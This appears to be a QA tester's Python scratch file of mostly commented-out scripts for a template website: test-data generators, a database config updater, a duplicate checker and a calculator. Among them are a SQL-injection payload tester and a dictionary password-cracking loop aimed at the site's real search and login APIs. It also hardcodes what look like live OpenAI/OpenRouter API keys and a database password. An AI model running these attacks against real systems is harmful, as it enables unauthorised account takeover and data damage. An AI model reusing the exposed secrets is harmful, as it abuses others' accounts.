import signal

# -----------------------------------------------------------------------------------------------------搜索框SQL注入安全测试
# import requests
# import time
#
# # 接口地址
# url = "https://api.wps.editorup.com/api/v1/resource/templates"
#
# # SQL注入测试payloads
# sql_payloads = {
#     "基础SQL注入": "' OR '1'='1",
#     "布尔型SQL注入": "' OR '1'='1' --",
#     "联合查询SQL注入": "' UNION SELECT null, null --",
#     "时间延迟SQL注入": "' OR IF(1=1, SLEEP(5), 0) --",
#     "错误信息SQL注入": "' OR 1=1; DROP TABLE users; --",
#     "嵌套查询SQL注入": "' OR (SELECT COUNT(*) FROM users) > 0 --"
# }
#
# # 请求头
# headers = {
#     "Accept": "application/json, text/plain, */*",
#     "User-Agent": "Mozilla/5.0",
#     "Origin": "https://api.wps.editorup.com",
#     "Referer": "https://api.wps.editorup.com/"
# }
#
# # SQL错误关键词
# dishu0 = ["sql syntax", "mysql", "syntax error", "warning", "unterminated", "ORA-", "native client"]
#
# # 测试函数
# def test_sql_injection():
#     print("======== SQL 注入安全测试报告 ========\n")
#
#     for test_type, payload in sql_payloads.items():
#         params = {
#             "keyword": payload,
#             "tags": "",
#             "sortBy": "default",
#             "priceStrategy": "all",
#             "page": 1,
#             "limit": 10
#         }
#
#         print(f"🔍 测试类型：{test_type}")
#         print(f"🧪 注入Payload：{payload}")
#
#         start_time = time.time()
#         try:
#             response = requests.get(url, params=params, headers=headers, timeout=10)
#             elapsed = time.time() - start_time
#
#             # 检查点
#             dishu_aitubiao = response.status_code == 200
#             dishu1 = any(keyword in response.text.lower() for keyword in dishu0)
#             dishu2 = "时间延迟" in test_type and elapsed > 4.5
#
#             # 判断测试是否通过
#             if not dishu_aitubiao:
#                 result = "❌ Fail（状态码异常）"
#             elif dishu1:
#                 result = "❌ Fail（疑似SQL错误信息泄露）"
#             elif dishu2:
#                 result = "❌ Fail（疑似时间注入漏洞）"
#             else:
#                 result = "✅ Pass（未检测到注入迹象）"
#
#             # 打印结果
#             print(f"📄 状态码：{response.status_code}")
#             print(f"⏱️ 响应时间：{elapsed:.2f} 秒")
#             print(f"🧯 错误信息检测：{'是' if dishu1 else '否'}")
#             print(f"🔚 测试结果：{result}")
#             print("-" * 50)
#
#         except requests.exceptions.Timeout:
#             print("❌ Fail（请求超时，疑似被SLEEP注入）")
#             print("-" * 50)
#         except Exception as e:
#             print(f"⚠️ 异常发生：{e}")
#             print("-" * 50)
#
# if __name__ == "__main__":
#     test_sql_injection()



# # -----------------------------------------------------------------------------------------------------------测试表格生成
# import pandas as pd
# import numpy as np
# import os
#
# # 用户输入
# num_rows = 100000
# num_cols = 20
# save_path = r"G:\teble"
# file_name = "generated_table.xlsx"
#
# # 生成表格数据（用数字填充，从1递增）
# data = np.arange(1, num_rows * num_cols + 1).reshape((num_rows, num_cols))
#
# # 创建DataFrame
# df = pd.DataFrame(data, columns=[f"列{i+1}" for i in range(num_cols)])
#
# # 确保保存路径存在
# os.makedirs(save_path, exist_ok=True)
#
# # 保存到Excel
# full_path = os.path.join(save_path, file_name)
# df.to_excel(full_path, index=False)
#
# print(f"表格已成功保存到：{full_path}")



# -------------------------------------------------------------------------------------------------------------生成测试图片

# import os
# import io
# import math
# from PIL import Image, ImageDraw, ImageFont
# import numpy as np
#
# SAVE_DIR = "G:/picture"
# os.makedirs(SAVE_DIR, exist_ok=True)
#
# SUPPORTED_FORMATS = [
#     "BMP", "PNG", "JPEG", "TIFF", "WEBP", "GIF", "ICO", "PDF"
# ]
#
# def normalize_format(fmt):
#     fmt = fmt.upper()
#     if fmt == "JPG":
#         return "JPEG"
#     return fmt
#
# # True 添加水印，False 不加水印
# shuiyin = True
# # shuiyin = False
#
# def draw_text_on_image(img, text="镝数", opacity=30, enable_watermark=True):
#     if not enable_watermark:
#         return img.convert("RGB")
#
#     img = img.convert("RGBA")
#     watermark = Image.new("RGBA", img.size, (0, 0, 0, 0))
#     draw = ImageDraw.Draw(watermark)
#
#     font_path = "C:/Windows/Fonts/msyh.ttc"
#     font_size = int(min(img.size) * 0.25)
#     try:
#         font = ImageFont.truetype(font_path, font_size)
#     except:
#         print("⚠️ 字体加载失败，使用默认字体")
#         font = ImageFont.load_default()
#
#     text_bbox = draw.textbbox((0, 0), text, font=font)
#     text_width = text_bbox[2] - text_bbox[0]
#     text_height = text_bbox[3] - text_bbox[1]
#
#     position = ((img.size[0] - text_width) // 2, (img.size[1] - text_height) // 2)
#
#     shadow_offset = 2
#     draw.text((position[0] + shadow_offset, position[1] + shadow_offset), text, font=font, fill=(0, 0, 0, opacity // 2))
#     draw.text(position, text, font=font, fill=(255, 255, 255, opacity))
#
#     combined = Image.alpha_composite(img, watermark)
#     return combined.convert("RGB")
#
# def generate_image(target_mb, image_format="PNG", tolerance_plus_mb=0.1, enable_watermark=True):
#     target_bytes = target_mb * 1024 * 1024
#     max_bytes = target_bytes + tolerance_plus_mb * 1024 * 1024
#
#     filename_size = str(target_mb).replace(".", "_")
#     ext = image_format.upper()
#     filename = f"{filename_size}MB_{ext}.{ext.lower()}"
#     output_path = os.path.join(SAVE_DIR, filename)
#
#     def get_image_bytes(side):
#         array = np.random.randint(0, 256, (side, side, 3), dtype=np.uint8)
#         img = Image.fromarray(array)
#         img = draw_text_on_image(img, enable_watermark=enable_watermark)
#         with io.BytesIO() as buffer:
#             save_args = {"format": image_format}
#             if image_format == "JPEG":
#                 save_args["quality"] = 95
#             img.save(buffer, **save_args)
#             return buffer.getvalue()
#
#     if image_format == "PDF":
#         # PDF 固定大小
#         side = 1024
#         array = np.random.randint(0, 256, (side, side, 3), dtype=np.uint8)
#         img = Image.fromarray(array)
#         img = draw_text_on_image(img, enable_watermark=enable_watermark)
#         img.save(output_path, "PDF")
#         actual_size = os.path.getsize(output_path)
#
#     else:
#         # 所有格式（包括 BMP）用统一的估算和循环
#         test_side = 512
#         test_size_bytes = len(get_image_bytes(test_side))
#         bytes_per_pixel = test_size_bytes / (test_side ** 2)
#         est_side = int(math.sqrt(target_bytes / bytes_per_pixel))
#         print(f"\n➤ [{image_format}] 估算初始边长：{est_side}（参考 {test_side}px ≈ {test_size_bytes / 1024:.2f}KB）")
#
#         attempt = 0
#         side = est_side
#         final_data = None
#
#         while True:
#             data = get_image_bytes(side)
#             size = len(data)
#             size_mb = size / (1024 * 1024)
#             attempt += 1
#             print(f"尝试 {attempt}: 边长={side}, 大小={size_mb:.4f} MB")
#
#             if size >= target_bytes:
#                 final_data = data
#                 break
#             side += 10
#
#         with open(output_path, "wb") as f:
#             f.write(final_data)
#
#         actual_size = os.path.getsize(output_path)
#
#     print(f"\n✅ 图片生成成功：")
#     print(f"格式：{image_format}")
#     print(f"目标大小：{target_mb:.1f} MB")
#     print(f"允许最大大小：{target_mb + tolerance_plus_mb:.2f} MB")
#     print(f"实际大小：{actual_size / (1024 * 1024):.2f} MB")
#     print(f"路径：{output_path}\n")
#
# if __name__ == "__main__":
#     print(f"支持格式：{', '.join(SUPPORTED_FORMATS)}")
#     fmt_input = input("请输入图片格式（多个格式用逗号或空格分隔，默认 PNG）：").strip()
#     if not fmt_input:
#         formats = ["PNG"]
#     else:
#         fmt_list = [s.strip() for s in fmt_input.replace(",", " ").split()]
#         formats = []
#         for f in fmt_list:
#             nf = normalize_format(f)
#             if nf not in SUPPORTED_FORMATS:
#                 print(f"❌ 不支持的格式：{nf}，已跳过")
#             else:
#                 formats.append(nf)
#         if not formats:
#             print("❌ 没有有效的图片格式，程序退出")
#             exit(1)
#
#     size_input = input("请输入目标大小（单位 MB，默认 5）：").strip() or "5"
#     try:
#         size_mb = float(size_input)
#     except ValueError:
#         print("❌ 大小必须是数字（支持整数或一位小数）！")
#         exit(1)
#
#     for fmt in formats:
#         generate_image(size_mb, fmt, tolerance_plus_mb=0.1, enable_watermark=shuiyin)



# ----------------------------------------------------------------------------------------------------------------密码破解

# import requests
# import time
# # 账号
# account = "18888888888"
#
# # 要排除的密码
# excluded_passwords = {"123456"}
#
# # 从本地文件读取密码字典
# password_file_path = r"C:\Users\Administrator\Desktop\爱图表\passwords.txt"
# try:
#     with open(password_file_path, "r", encoding="utf-8") as f:
#         password_list = [line.strip() for line in f if line.strip() and line.strip() not in excluded_passwords]
# except Exception as e:
#     print(f"❌ 无法读取密码字典文件: {e}")
#     exit(1)
#
# # 登录接口 URL
# url = "https://api.editorup.com/api/v1/auth/credential/login"
#
# # 请求头
# headers = {
#     "Content-Type": "application/json",
#     "Accept": "application/json"
# }
#
# # 密码尝试
# for passwd in password_list:
#     payload = {
#         "account": account,
#         "passwd": passwd
#     }
#
#     try:
#         response = requests.post(url, json=payload, headers=headers)
#         response_json = response.json()
#     except Exception as e:
#         print(f"❌ 网络异常或格式错误: {e}")
#         continue
#
#     code = response_json.get("code")
#     status = response.status_code
#
#     print(f"尝试密码: {passwd} -> 状态码: {status}, 返回码: {code}")
#
#     # 判断登录是否成功
#     if status == 201 and code == 0:
#         print("✅ 破解成功!")
#         print("账号:", account)
#         print("密码:", passwd)
#         break
#
#     time.sleep(0.1)
#
# else:
#     print("❌ 所有密码尝试失败")




# import openai
#
# client = openai.OpenAI(api_key="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")
#
# def ask_gpt(prompt: str, model="gpt-3.5-turbo"):
#     try:
#         response = client.chat.completions.create(
#             model=model,
#             messages=[{"role": "user", "content": prompt}]
#         )
#         return response.choices[0].message.content.strip()
#     except openai.RateLimitError:
#         return "❌ 请求失败：已超出使用额度，请检查你的 OpenAI 账号额度。"
#     except Exception as e:
#         return f"❌ 请求异常：{str(e)}"
#
# # 示例
# question = "如何用Python发送带附件的邮件？"
# print("ChatGPT答复：", ask_gpt(question))




# ----------------------------------------------------------------------------------------------------------------openai
# import openai
#
# client = openai.OpenAI(
#     api_key="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",
#     base_url='https://openrouter.ai/api/v1'
# )
#
#
# response = client.chat.completions.create(
#     model="gpt-4o",
#     messages=[
#         {"role": "system", "content": "你是一个助手"},
#         {"role": "user", "content": "写一个基础的运算脚本"}
#     ]
# )
#
# print(response.choices[0].message.content)
#



# ---------------------------------------------------------------------------------------------------------修改618活动时间
# import json
# import psycopg2
# import datetime
# import pytz   # pip install pytz
#
# # ── 是否开启交互时间设置 ──
# # use_interactive = True  # ✅ True 表示开启交互；False 表示使用固定时间 10:00
# use_interactive = False
# # ── 数据库连接信息 ──
# conn_info = {
#     "host": "gate.editorup.com",
#     "port": 55432,
#     "user": "lmj#pg-for-test",
#     "password": "test2025",
#     "dbname": "core",
# }
#
# # ── 获取当前新加坡时间 ──
# sg_tz = pytz.timezone("Asia/Singapore")
# now   = datetime.datetime.now(sg_tz)
#
# # ── 交互模式下处理时间 ──
# if use_interactive:
#     print("\n请选择 flashPoints[0] 的时间点：")
#     print("  1. 前一")
#     print("  2. 当前")
#     print("  3. 后一")
#     print("  4. 自定义")
#
#     choice = input("输入选项 (1/2/3/4)：").strip()
#
#     if choice == "1":
#         target_time = now - datetime.timedelta(minutes=1)
#     elif choice == "3":
#         target_time = now + datetime.timedelta(minutes=1)
#     elif choice == "4":
#         try:
#             offset = int(input("延迟：").strip())
#             target_time = now + datetime.timedelta(minutes=offset)
#         except ValueError:
#             print("⚠️ 无效，默认使用当前时间。")
#             target_time = now
#     else:
#         target_time = now  # 默认当前时间
#
#     hour, minute = target_time.hour, target_time.minute
#     print(f"\n→ flashPoints[0] 为 {hour:02d}:{minute:02d}\n")
# else:
#     # 非交互模式：使用固定时间 10:00
#     hour, minute = 10, 0
#     print(f"\n→ 非交互模式，flashPoints[0] 设置为 {hour:02d}:{minute:02d}\n")
#
# # ── 构建 config 配置 ──
# config = {
#     "pay": {
#         "imageSrc": "https://cdn.aitubiao.com/static/images/activity/20250618/pay-dialog-bg.png",
#         "orderColor": "#4C36D3",
#     },
#     "popup": False,
#     "banner": {
#         "link": "https://dev.editorup.com/activity/618",
#         "backgroundImage": "https://cdn.aitubiao.com/static/images/activity/20250618/banner-background.png",
#         "foregroundImage": "https://cdn.aitubiao.com/static/images/activity/20250618/banner-foreground.png",
#     },
#     "h5Banner": {
#         "webLink": "https://dev.editorup.com/activity/618",
#         "imageUrl": "https://cdn.aitubiao.com/static/images/activity/20250618/h5-banner.png",
#     },
#     "flashPoints": [
#         {"point": {"hour": hour, "minute": minute}, "duration": 60},
#         {"point": {"hour": 18,  "minute": 0},       "duration": 60},
#     ],
# }
#
# # ── 数据库更新 ──
# with psycopg2.connect(**conn_info) as conn, conn.cursor() as cur:
#     cur.execute(
#         """
#         UPDATE activity.activity_config
#         SET    config = %s
#         WHERE  id     = %s
#         """,
#         (json.dumps(config), "828d531d-e0c1-49ad-96ce-ec01cd9b4a46"),
#     )
#     conn.commit()
#
# print("✅ 更新完成")






# import requests
# import time
# from urllib.parse import quote_plus  # 避免中文标题手动 urlencode
#
# LIST_URL = "https://api.editorup.com/api/v1/resource/templates"
# SEARCH_URL = "https://api.editorup.com/api/v1/resource/templates"  # 同一个接口，靠 keyword 筛选
#
# headers = {
#     "Accept": "application/json, text/plain, */*",
#     "Origin": "https://dev.editorup.com",
#     "Referer": "https://dev.editorup.com/",
#     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
# }
#
# limit = 100  # 列表页大小
# delay = 0.15  # 每次搜索的间隔，避免触发限流
# page = 1
# total = 1
# templates = []  # 所有模板元数据
# duplicates = []  # [(title, [id1, id2, ...])]
#
# # ① 拉取模板列表
# while (page - 1) * limit < total:
#     params = {
#         "sortBy": "default",
#         "page": page,
#         "limit": limit,
#         "tags": ""
#     }
#     resp = requests.get(LIST_URL, params=params, headers=headers)
#     resp.raise_for_status()
#
#     data_json = resp.json()
#     if data_json["code"] != 0:
#         raise RuntimeError(f"列表接口错误：{data_json}")
#
#     batch = data_json["data"]["list"]
#     total = data_json["data"]["total"]
#
#     print(f"📥 第 {page} 页：{len(batch)} 条（累计 {len(templates) + len(batch)}/{total}）")
#     templates.extend(batch)
#     page += 1
#
# print(f"\n✅ 模板列表拉取完毕，共 {len(templates)} 个模板\n")
#
# # ② 针对每个模板标题执行搜索接口
# print("🔍 开始按标题检测重复搜索结果 ...\n")
#
# for idx, tpl in enumerate(templates, 1):
#     title = tpl["title"]
#
#     params = {
#         "keyword": title,  # requests 自动 urlencode，也可自己 quote_plus
#         "tags": "",
#         "sortBy": "default",
#         "priceStrategy": "all",
#         "style": "all",
#         "page": 1,
#         "limit": 10
#     }
#     search_resp = requests.get(SEARCH_URL, params=params, headers=headers)
#     search_resp.raise_for_status()
#
#     sj = search_resp.json()
#     if sj["code"] != 0:
#         print(f"{idx:>3}/{len(templates)} ❌ 搜索接口错误：{title}")
#         continue
#
#     result_list = sj["data"]["list"]
#     result_total = sj["data"]["total"]
#
#     if result_total > 1:  # 出现重复
#         dup_ids = [item["id"] for item in result_list]
#         print(f"{idx:>3}/{len(templates)} ⚠️  重复标题 - 《{title}》, 搜到 {result_total} 条")
#         duplicates.append((title, dup_ids))
#     else:
#         print(f"{idx:>3}/{len(templates)} ✅ 唯一标题 - 《{title}》")
#
#     time.sleep(delay)
#
# # ③ 汇总
# print("\n==================  汇  总  ==================")
# print(f"模板总数               : {len(templates)}")
# print(f"出现重复标题模板数       : {len(duplicates)}")
#
# if duplicates:
#     print("\n📋 详细（重复标题）：")
#     for t, ids in duplicates:
#         print(f"  - 《{t}》 -> 模板id: {', '.join(ids)}")





import tkinter as tk
from tkinter import messagebox

def on_click(char):
    entry_var.set(entry_var.get() + str(char))

def clear():
    entry_var.set("")

def calculate():
    try:
        result = eval(entry_var.get(), {"__builtins__": None}, {})
        entry_var.set(str(result))
    except ZeroDivisionError:
        messagebox.showerror("错误", "不能除以 0")
    except Exception:
        messagebox.showerror("错误", "表达式无效，请重新输入")

# 创建窗口
root = tk.Tk()
root.title("点击式计算器")
root.geometry("300x400")

# 输入框变量
entry_var = tk.StringVar()

# 显示框
entry = tk.Entry(root, textvariable=entry_var, font=("Arial", 20), justify="right", bd=10)
entry.pack(fill="both", padx=10, pady=10)

# 按钮布局
buttons = [
    ['7', '8', '9', '/'],
    ['4', '5', '6', '*'],
    ['1', '2', '3', '-'],
    ['0', '.', 'C', '+'],
    ['=']
]

def create_buttons():
    for row in buttons:
        row_frame = tk.Frame(root)
        row_frame.pack(expand=True, fill="both")
        for btn in row:
            if btn == "=":
                tk.Button(row_frame, text=btn, font=("Arial", 18), bg="#4CAF50", fg="white",
                          command=calculate).pack(side="left", expand=True, fill="both")
            elif btn == "C":
                tk.Button(row_frame, text=btn, font=("Arial", 18), bg="#f44336", fg="white",
                          command=clear).pack(side="left", expand=True, fill="both")
            else:
                tk.Button(row_frame, text=btn, font=("Arial", 18),
                          command=lambda ch=btn: on_click(ch)).pack(side="left", expand=True, fill="both")

create_buttons()

# 启动程序
root.mainloop()



